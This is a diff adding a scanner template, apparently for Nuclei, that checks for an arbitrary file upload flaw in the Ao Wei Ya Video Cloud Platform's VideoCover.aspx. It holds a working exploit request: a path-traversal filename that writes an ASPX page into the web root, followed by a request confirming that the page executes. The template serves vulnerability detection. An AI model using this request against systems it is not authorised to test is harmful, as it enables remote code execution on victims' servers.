@@ -1,0 +1,48 @@
+id: poc-yaml-ao-wei-ya-video-cloud-platform-videocover-aspx-anyfile-upload
+info:
+  name: Ao Wei Ya Video Cloud Platform VideoCover.aspx Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Ao Wei Ya Video Cloud Platform contains an arbitrary file upload vulnerability in VideoCover.aspx, which can be exploited to upload malicious files and achieve remote code execution.
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Tools/Video/VideoCover.aspx"
+    headers:
+      Content-Type: multipart/form-data; boundary=68c4ca658cd4332dc386f53710e63a10
+    body: |-
+      --68c4ca658cd4332dc386f53710e63a10
+      Content-Disposition: form-data; name="file";filename="/../../../AVA.ResourcesPlatform.WebUI/{{t1}}.aspx"
+      Content-Type: image/jpeg
+
+      <%@Page Language="C#"%><%Response.Write("{{t2}}");%>
+      --68c4ca658cd4332dc386f53710e63a10--
+    matchers:
+      - type: word
+        words:
+          - "Success"
+        part: body
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
